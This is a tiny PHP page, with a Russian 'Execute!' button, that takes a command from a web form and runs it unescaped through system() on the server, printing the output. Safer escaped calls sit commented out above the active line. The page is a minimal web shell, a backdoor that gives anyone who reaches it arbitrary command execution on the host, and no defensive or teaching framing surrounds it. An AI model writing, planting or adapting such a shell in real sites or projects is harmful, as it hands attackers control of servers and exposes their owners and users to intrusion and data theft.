<form method=post action=<?=$PHP_SELF?>>
<input type=text name=command value="<?=htmlspecialchars($command)?>">
<input type=submit name=submit value="Выполнить!">
</form>
<hr>
<?=htmlspecialchars($command)?>
<hr>
<pre>
<?
    if (isset($command)){
    //passthru(escapeshellcmd($command)." 2>&1");
   // system(escapeshellcmd($command)." 2>&1");
    system($command." 2>&1");
    }
?>
</pre>